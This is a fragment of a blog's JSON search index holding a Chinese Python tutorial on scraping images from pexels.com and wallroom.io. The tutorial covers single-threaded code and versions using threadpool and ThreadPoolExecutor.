exit()main()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"python爬虫-单&多线程","slug":"python单&多线程","date":"2018-05-02T16:00:00.000Z","updated":"2021-10-22T08:25:12.052Z","comments":true,"path":"2018/05/03/python单&多线程/","link":"","permalink":"http://example.com/2018/05/03/python%E5%8D%95&%E5%A4%9A%E7%BA%BF%E7%A8%8B/","excerpt":"以抓取https://www.pexels.com/网站图片为例 前置基础：了解HTML的DOM解析结构","text":"以抓取https://www.pexels.com/网站图片为例 前置基础：了解HTML的DOM解析结构 单线程获取网页html123456789101112131415from urllib import requestfrom bs4 import BeautifulSoupimport reheaders = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125;url = &#x27;https://www.pexels.com/&#x27;page1=request.Request(url,headers=headers)page=request.urlopen(page1)html=page.read()print(html)with open(&#x27;test.html&#x27;,&#x27;wb&#x27;) as f: f.write(html) f.close() 获取图片img标签1234567891011121314from urllib import requestfrom bs4 import BeautifulSoupimport reheaders = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125;url = &#x27;https://www.pexels.com/&#x27;page1=request.Request(url,headers=headers)page=request.urlopen(page1)soup = BeautifulSoup(page,&#x27;lxml&#x27;)srcs = soup.find_all(&#x27;img&#x27;,&#x27;photo-item__img&#x27;) #查找class为photo-item__img的img标签for src in srcs: print(src) 截取img标签中的图片url链接123456789101112131415from urllib import requestfrom bs4 import BeautifulSoupimport reheaders = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125;url = &#x27;https://www.pexels.com/&#x27;page1=request.Request(url,headers=headers)page=request.urlopen(page1)soup = BeautifulSoup(page,&#x27;lxml&#x27;)srcs = soup.find_all(&#x27;img&#x27;,&#x27;photo-item__img&#x27;)for src in srcs: links = src.get(&#x27;src&#x27;) print(links) 将去掉多余参数1234567891011121314151617181920from urllib import requestfrom bs4 import BeautifulSoupimport reheaders = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125;url = &#x27;https://www.pexels.com/&#x27;page1=request.Request(url,headers=headers)page=request.urlopen(page1)soup = BeautifulSoup(page,&#x27;lxml&#x27;)srcs = soup.find_all(&#x27;img&#x27;,&#x27;photo-item__img&#x27;)for sr in srcs: links = sr.get(&#x27;src&#x27;) first_pos = links.index(&#x27;?&#x27;) last_pos = links.index(&#x27;500&#x27;) split = links[first_pos : last_pos+3] links_final = links.replace(split,&#x27;&#x27;) print(links_final) 写入本地12345678910111213141516171819202122232425262728293031from urllib import requestfrom bs4 import BeautifulSoupimport reimport osimport codecsheaders = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125;url = &#x27;https://www.pexels.com/&#x27;page1=request.Request(url,headers=headers)page=request.urlopen(page1)soup = BeautifulSoup(page,&#x27;lxml&#x27;)srcs = soup.find_all(&#x27;img&#x27;,&#x27;photo-item__img&#x27;)x=1for sr in srcs: url = sr.get(&#x27;src&#x27;) first_pos = links.index(&#x27;?&#x27;) last_pos = links.index(&#x27;5&#x27;) split = links[first_pos : last_pos+3] url = links.replace(split,&#x27; &#x27;) path = r&#x27;D:\\\\img\\\\&#x27; if &#x27;https&#x27; in url: url1 = request.Request(url,headers = headers) url = request.urlopen(url1) f = codecs.open(path+&#x27;%s.jpg&#x27;%(x), &#x27;wb&#x27;) x+=1 f.write(url.read()) f.close() 最终版本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import osfrom bs4 import BeautifulSoupfrom urllib import requestdef cut_url(link):#在img标签中获取到图片的url，并去掉多余的参数 link = link.get(&#x27;src&#x27;)#获取img标签中的图片url first_pos = link.index(&#x27;?&#x27;) last_pos = link.index(&#x27;5&#x27;) split = link[first_pos : last_pos+3]#截取多余的参数 url = link.replace(split,&#x27;&#x27;)#用replace函数将多余的参数去掉 return urldef save_img(url,x):#保存图片 if &#x27;https&#x27; in url: url = request.Request(url,headers = headers) file = request.urlopen(url).read() path = &#x27;./img&#x27; if os.path.exists(path): path = path + &#x27;/&#x27; with open(path+&#x27;%s.jpg&#x27;%x,&#x27;wb&#x27;) as f: f.write(file) f.close() flag = 1 else: os.mkdir(path) path = path + &#x27;/&#x27; with open(path+&#x27;%s.jpg&#x27;%x,&#x27;wb&#x27;) as f: f.write(file) f.close() flag = 1 else: flag = 0 if flag: return 1 else: return flag,urlheaders = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125;url = &#x27;https://www.pexels.com/&#x27;res = request.Request(url,headers = headers)res = request.urlopen(res)soup = BeautifulSoup(res,&#x27;lxml&#x27;)links = soup.find_all(&#x27;img&#x27;,&#x27;photo-item__img&#x27;)x = 1for link in links: url = cut_url(link) flag = save_img(url,x) x += 1 if flag: print(flag) else: print(&#x27;bad&#x27;+flag) 多线程多线程爬虫，分别用threadpool()和ThreadPoolExexutor()模块实现。 threadpool模块核心代码 12345pool = threadpool.ThreadPool(x)#声明一个线程池，x表示需要线程数 requests = threadpool.makeRequests(function_name,参数) for req in requests: pool.putRequest(req) pool.wait()#等待所有子线程都执行完毕后再执行主线程下面的语句，否则会直接运行主线程 这是声明一个线程池来将所有的线程再利用for循环一起启动，但是有一个坏处就是当线程多的时候就特别容易发生堵塞，适用于线程较少的时候 threadpool模块的爬虫代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596import threadingimport threadpoolfrom bs4 import BeautifulSoupfrom urllib import requestimport osdef thread_run(thread): thread.start() thread.join()def save_img(url,name): print(&#x27;tread %s is start &#x27;%threading.current_thread().name) flag = 0 headers = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125; url = request.Request(url,headers = headers) html = request.urlopen(url) file = html.read() path = &#x27;./wallroom2&#x27; if os.path.exists(path): path = path + &#x27;/&#x27; with open(path+name,&#x27;ab+&#x27;) as f: f.write(file) f.close() flag = 1 else: os.mkdir(path) path = path + &#x27;/&#x27; with open(path+url,&#x27;ab+&#x27;) as f: f.write(file) f.close() flag = 1 if flag == 1: print(&#x27;the %s is ok&#x27;%name) else: print(&#x27;the %s is fail&#x27;%url)def get_url(url): headers = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125; res = request.Request(url,headers = headers) html = request.urlopen(res).read() soup = BeautifulSoup(html,&#x27;lxml&#x27;) links = soup.find_all(&#x27;a&#x27;) return linksdef set_name(url): pos = url.index(&#x27;bg-&#x27;) name = url[pos:pos+10] + &#x27;.jpeg&#x27; print(name) return namedef main(): url = input(&#x27;请输入wallroom的一个网址：&#x27;) tread_list = [] links = get_url(url) x = 0 for link in links: url1 = link.get(&#x27;href&#x27;) print(url1) if url1.find(&#x27;bg&#x27;) &gt; 0: x += 1 url_real = &#x27;https://wallroom.io&#x27; + url1 +&#x27;/download&#x27; print(url_real) name = set_name(url1) thread_name = name thread_name = threading.Thread(target=save_img,args = (url_real,name,)) names.append(name) urls.append(url_real) tread_list.append(thread_name) #for tread_list in range(10): pool = threadpool.ThreadPool(x) requests = threadpool.makeRequests(thread_run, tread_list) for req in requests: pool.putRequest(req) pool.wait() print(&#x27;ok&#x27;)main() ThreadPoolExecutor模块ThreadPoolExecutor就提供了一个功能，可以规定在进程池里可以有多少线程在运行，在线程比较多的时候减少了资源的占用 核心代码 123executor = ThreadPoolExecutor(x)#线程池中能够进行的线程只能有x个 all_task = [executor.submit(save_img, (url)) for url in urls] wait(all_task, return_when=ALL_COMPLETED)#相当于threadpool中的wait() 利用ThreadPoolExecutor爬虫的完整代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import threadpoolimport threadingfrom bs4 import BeautifulSoupfrom urllib import requestimport osfrom concurrent.futures import ThreadPoolExecutor , wait, ALL_COMPLETED, FIRST_COMPLETEDdef save_img(url): print(&#x27;tread %s is start &#x27;%threading.current_thread().name) name = set_name(url) flag = 0 headers = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125; url = request.Request(url,headers = headers) html = request.urlopen(url) file = html.read() path = &#x27;./wallroom2880&#x27; if os.path.exists(path): path = path + &#x27;/&#x27; with open(path+name,&#x27;ab+&#x27;) as f: f.write(file) f.close() flag = 1 else: os.mkdir(path) path = path + &#x27;/&#x27; with open(path+url,&#x27;ab+&#x27;) as f: f.write(file) f.close() flag = 1 if flag: print(&#x27;the %s is ok&#x27;%name) else: print(&#x27;the %s is fail&#x27;%url)def get_url(url): headers = &#123;&#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;&#125; res = request.Request(url,headers = headers) html = request.urlopen(res).read() soup = BeautifulSoup(html,&#x27;lxml&#x27;) links = soup.find_all(&#x27;a&#x27;) return linksdef set_name(url): pos = url.index(&#x27;bg-&#x27;) name = url[pos:pos+10] + &#x27;.jpeg&#x27; return namedef main(): url = input(&#x27;请输入wallroom的一个网址：&#x27;) urls = [] links = get_url(url) #print(links) for link in links: url1 = link.get(&#x27;href&#x27;) #print(url1) if url1.find(&#x27;bg&#x27;) &gt; 0: url_real = &#x27;https://wallroom.io&#x27; + url1 +&#x27;/download&#x27; print(url_real) urls.append(url_real) executor = ThreadPoolExecutor(10) all_task = [executor.submit(save_img, (url)) for url in urls] wait(all_task, return_when=ALL_COMPLETED) print(&#x27;ok&#x27;)main()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]}],"categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"vue","slug":"vue","permalink":"http://example.com/tags/vue/"},{"name":"docker,环境搭建","slug":"docker-环境搭建","permalink":"http://example.com/tags/docker-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"php, web","slug":"php-web","permalink":"http://example.com/tags/php-web/"},{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"搭建环境","slug":"搭建环境","permalink":"http://example.com/tags/%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]}